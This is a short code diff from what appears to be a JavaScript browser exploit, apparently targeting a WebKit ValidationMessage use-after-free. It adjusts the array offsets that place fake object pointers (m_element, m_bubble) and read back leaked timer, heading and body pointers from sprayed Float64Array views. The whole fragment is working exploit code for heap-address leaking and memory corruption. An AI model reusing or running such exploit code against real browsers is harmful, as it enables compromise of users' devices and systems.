@@ -397,7 +397,7 @@ function reuseTargetObj() {
 		let view = new Float64Array(ab);
 
 		view[0] = guess_htmltextarea_addr.asDouble();   // m_element
-		view[3] = guess_htmltextarea_addr.asDouble();   // m_bubble
+		view[2] = guess_htmltextarea_addr.asDouble();   // m_bubble
 
 		g_arr_ab_1.push(view);
 	}
@@ -431,7 +431,7 @@ function findTargetObj() {
 			debug_log("[+] Found fake ValidationMessage");
 
 			if (g_round === 2) {
-				g_timer_leak = Int64.fromDouble(g_arr_ab_1[i][2]);
+				g_timer_leak = Int64.fromDouble(g_arr_ab_1[i][3]);
 				g_message_heading_leak = Int64.fromDouble(g_arr_ab_1[i][4]);
 				g_message_body_leak = Int64.fromDouble(g_arr_ab_1[i][5]);
 				g_round++;
